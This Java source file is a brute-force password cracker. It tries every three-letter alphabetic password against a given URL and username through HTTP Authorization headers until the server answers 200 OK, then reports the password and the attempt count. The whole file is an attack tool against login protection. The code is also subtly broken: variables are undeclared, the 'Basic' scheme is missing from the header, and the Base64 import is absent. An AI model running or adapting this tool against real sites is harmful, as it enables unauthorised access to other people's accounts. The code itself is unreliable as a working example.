import java.net.*;
import java.io.*;

public class BruteForce {
  private String strUserName;
  private String strURL;
  private int iAttempts;
  
  public BruteForce(String strURL,String strUserName) {
    this.strURL = strURL;
    this.strUserName = strUserName;
    this.iAttempts = 0 ;

  }
  
  public String getPassword(){
      URL u;
      String result ="";
      PassGenBrute PG = new PassGenBrute(3);
      URLConnection uc;
      String strPassword = new String();
      String strEncode;
      try{
        while (result.compareTo("HTTP/1.1 200 OK")!=0){
        
          strEncode = PG.getNewPassword();
          u = new URL(strURL);
          uc = u.openConnection();
          uc.setDoInput(true);
          uc.setDoOutput(true);
          strPassword = strEncode;
          strEncode =  strUserName + ":" + strEncode;
        
          strEncode = new String(Base64.encode(strEncode.getBytes()));
          uc.setRequestProperty("Authorization"," " + strEncode);
        
          result = uc.getHeaderField(0);
          uc = null;
          u = null;
          iAttempts++;
        }

      }
      catch (Exception me) {
      System.out.println("MalformedURLException: "+me);
      }
      return(strPassword);
  }
  
  public int getAttempts(){
    return (iAttempts);
  };
  
  public static void main (String arg[]){
     timeStart = 0;
     timeEnd = 0;
    
    if (arg.length == 2) {
       BruteForce BF = new BruteForce(arg[0],arg[1]);
       System.out.println("Processing ... ");
       timeStart = System.currentTimeMillis();
       
       System.out.println("Password = " + BF.getPassword());
       timeEnd = System.currentTimeMillis();
       System.out.println("Total Time Taken = " + (timeEnd - timeStart) + " (msec)");
       System.out.println("Total Attempts  = " + BF.getAttempts());
    }
    else {
       System.out.println("[Usage] java BruteForce <URL> <USERNAME>");

    }

  }
}

class PassGenBrute {
  private char[] password;
  public PassGenBrute(int lenght) {
    password = new char[lenght];
    for (int i = 0; i < lenght; i++){
      password[i] = 65;
    }
    password[0]--;
  }
  
  public String getNewPassword()
    throws PasswordFailureException{
    password[0]++;

    try {
      for (int i=0; i<password.length ; i++){
        if (password[i] == 90) {
          password[i] = 97;
        }
        if (password[i] > 122) {
          password[i] = 65;
          password[i+1]++;
        }
      }
    }
    catch (RuntimeException re){
      throw new PasswordFailureException ();
    }
    return new String(password);
  }
}

class PasswordFailureException extends RuntimeException {

  public PasswordFailureException() {
  }
}